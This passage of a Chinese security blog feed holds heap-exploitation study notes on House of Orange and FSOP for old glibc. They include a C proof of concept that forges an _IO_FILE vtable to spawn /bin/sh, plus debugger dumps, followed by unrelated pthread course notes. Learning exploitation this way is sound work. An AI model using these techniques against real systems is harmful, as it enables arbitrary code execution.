&#x3D;&gt; <code>malloc_printerr</code> &#x3D;&gt; <code>__libc_message</code> &#x3D;&gt; <code>abort</code> &#x3D;&gt; <code>fflush</code>&#x3D;&gt;<code>_IO_flush_all_lockp</code>&#x3D;&gt;<code>_IO_OVERFLOW</code></p><p>_IO_flush_all_lockp里需要绕过一些 具体参考FSOP</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus*)<span class="number">0x602400</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">4196319</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x602460</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t*)<span class="number">0x602460</span>                                                                                                                                                                       </span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x4007df</span> &lt;winner&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x602460</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure></li></ul><p>malloc fail 但拿到shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2.23&gt; ./house_of_orange </span><br><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./house_of_orange&#x27;: malloc(): memory corruption: 0x00007ffff7dd2520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7ffff7a8f15e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a911d4]</span><br><span class="line">./house_of_orange[0x4007d8]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]</span><br><span class="line">./house_of_orange[0x4005d9]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">00400000-00401000 r-xp 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00602000-00645000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7fdc000-7ffff7fdf000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h3 id="成功率"><a href="#成功率" class="headerlink" title="成功率"></a>成功率</h3><p>houseoforange成功率只有%50</p><p>_IO_flush_all_lockp函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，第一个结构体是main_arena+88 main_arena+88+0xc0是_mode字段</p><p>这个字段是libc随机的，0到0xffffffff之间的任意值，但是如果大于0x7fffffff的话该值就为负</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>正数<code>(fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>一定成立，会遍历他的vtable，由于他的vtable我们没有控制，最终调用函数出差</p><p>所以负数才行<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>是相等的</p>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSOP</title>
      <link href="/2023/04/06/FSOP/"/>
      <url>/2023/04/06/FSOP/</url>
      
        <content type="html"><![CDATA[<h2 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h2><p>FSOP利用前提要有libc地址，核心就是劫持_chain链表头_IO_list_all伪造_IO_FILE 项和vtable</p><p>之前exit()分析时会_IO_flush_all_lockp,里面会调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp会在以下触发</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时(其实也是最后调用exit)</p></li></ol><p>需要伪造的_IO_FILE绕过一下条件</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+vtable_offset)=((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=sh;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="type">long</span> <span class="type">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_list_all</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x602110</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x602110</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x4005b6 &lt;sh&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p sh</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;void ()&#125; 0x4005b6 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/FSOP/image-20230406132711374.png" alt="image-20230406132711374"></p><p><img src="/2023/04/06/FSOP/image-20230406132733192.png" alt="image-20230406132733192"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:多处理器编程</title>
      <link href="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/3.slides#">http://jyywiki.cn/OS/2022/slides/3.slides#</a></p><h2 id="thread-h-简化的线程-API"><a href="#thread-h-简化的线程-API" class="headerlink" title="thread.h 简化的线程 API"></a><code>thread.h</code> 简化的线程 API</h2><p>进程是资源分配的基本单位，linux线程其实是通过轻量级进程实现的LWP(light weight process)，所有Linux内核的角度去看线程和进程并没有区别，只不过他和主线程共享一些资源，线程是最小的执行单位，调度的基本单位。同时也是资源竞争的基本单位。</p><p>具体的东西之前 <a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">https://grxer.github.io/2023/03/26/TLS-Hijack/</a> 里有讨论</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id, status;</span><br><span class="line">  <span class="type">pthread_t</span> thread;</span><br><span class="line">  <span class="type">void</span> (*entry)(<span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">wrapper</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (<span class="keyword">struct</span> thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span> *fn)</span> &#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (<span class="keyword">struct</span> thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123; </span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>POSIX线程库进一步做了一层封装，做了个main函数的析构函数阻塞进程等待</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">                 <span class="type">pthread_t</span> * tidp,   <span class="comment">//新创建的线程ID指向的内存单元。</span></span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">pthread_attr_t</span> * attr,  <span class="comment">//线程属性</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="comment">//新创建的线程从start_rtn函数的地址开始运行,使用参数时我们通常会进行类型强转</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> * arg <span class="comment">//若上述函数需要参数，将参数放入结构中并将地址作为arg传入。</span></span></span><br><span class="line"><span class="params">                  )</span>;<span class="comment">//创建成功返回0，否则返回错误信息对应的非0宏</span></span><br><span class="line"><span class="type">void</span>类型的指针配合上类型强转给了我们更多的灵活性和自由性</span><br><span class="line"><span class="type">pthread_t</span>类型的线程tibp，是进程内部，识别标志,两个进程间，这个线程ID允许相同</span><br><span class="line">pthread_create函数创建的线程默认非分离属性的，在非分离的情况下，当一个线程结束的时候，它所占用的系统资源并没有完全真正的释放，也没有真正终止。</span><br><span class="line">只有在pthread_join函数返回时，该线程才会释放自己的资源。或者是设置在分离属性的情况下，一个线程结束会立即释放它所占用的资源。</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;分离一个线程，一个分离的线程是不能被其他线程回收或杀死的。它的内存资源在它终止时由系统自动释放。</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="comment">//指定等待哪个子线程结束，接收哪个线程的返回值，只能是非分离线程</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> ** retval<span class="comment">//接收参数返回值</span></span></span><br><span class="line"><span class="params">                )</span>;<span class="comment">//成功返回0，否则返回错误信息对应的非0宏</span></span><br><span class="line">一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除。</span><br><span class="line">如果一个线程是非分离的（默认情况下创建的线程都是非分离）并且没有对该线程使用 pthread_join() 的话，该线程结束后并不会释放其内存(系统)空间，这会导致该线程变成了“僵尸线程”。join后我们也必须手动清除程序分配的空间(堆等等)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>_attribute__关键字主要是用来在函数或数据声明中设置其属性。给函数赋给属性的主要目的在于让编译器进行优化。</p></li><li><p>使用编译时pthread 库需要加上-lpthread，因为pthread并非Linux系统的默认库</p><blockquote><p>-lpthread 选项只是告诉编译器在链接时链接 pthread 库。</p><p>-pthread 将自动添加必要的编译选项和链接选项，以确保程序正确地使用 pthread 库,编译器会自动将 “-lpthread” 选项添加到链接命令行中，以确保在链接时链接 pthread 库。</p></blockquote></li></ul><h3 id="创建线程使用的是哪个系统调用？"><a href="#创建线程使用的是哪个系统调用？" class="headerlink" title="创建线程使用的是哪个系统调用？"></a>创建线程使用的是哪个系统调用？</h3><p>strace了一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7ffff73ff000</span><br><span class="line">mprotect(0x7ffff7400000, 8388608, PROT_READ|PROT_WRITE) = 0</span><br><span class="line">getrandom(&quot;\x5c\xf7\x7d\x5a\x8a\x60\xbd\x73&quot;, 8, GRND_NONBLOCK) = 8</span><br><span class="line">brk(NULL)                               = 0x555555559000</span><br><span class="line">brk(0x55555557a000)                     = 0x55555557a000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, ~[], [], 8)   = 0</span><br><span class="line">clone3(&#123;flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7ffff7bff910, parent_tid=0x7ffff7bff910, exit_signal=0, stack=0x7ffff73ff000, stack_size=0x7fff00, tls=0x7ffff7bff640&#125;gr</span><br><span class="line"> =&gt; &#123;parent_tid=[8670]&#125;, 88) = 8670</span><br></pre></td></tr></table></figure><p>gdb跟了一下，最后系统调用函数clong3进内核syscall的时候是一个很奇怪未知的调用号</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215319891.png" alt="image-20230404215319891"></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215306823.png" alt="image-20230404215306823"></p><h3 id="gdb调试多线程"><a href="#gdb调试多线程" class="headerlink" title="gdb调试多线程"></a>gdb调试多线程</h3><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Threads.html">https://sourceware.org/gdb/onlinedocs/gdb/Threads.html</a></p><h2 id="线程独立的栈区"><a href="#线程独立的栈区" class="headerlink" title="线程独立的栈区"></a>线程独立的栈区</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objdump to see how thread-local variables are implemented</span></span><br><span class="line">__attribute__((noinline)) <span class="type">void</span> <span class="title function_">set_cur</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123; cur = ptr; &#125;</span><br><span class="line">__attribute__((noinline)) <span class="type">char</span> *<span class="title function_">get_cur</span><span class="params">()</span>         &#123; <span class="keyword">return</span> cur; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stackoverflow</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">  set_cur(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">1024</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> sz = base - get_cur();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack size of T%d &gt;= %d KB\n&quot;</span>, id, sz / <span class="number">1024</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stackoverflow(n + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tprobe</span><span class="params">(<span class="type">int</span> tid)</span> &#123;</span><br><span class="line">  id = tid;</span><br><span class="line">  base = (<span class="type">void</span> *)&amp;tid;</span><br><span class="line">  stackoverflow(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 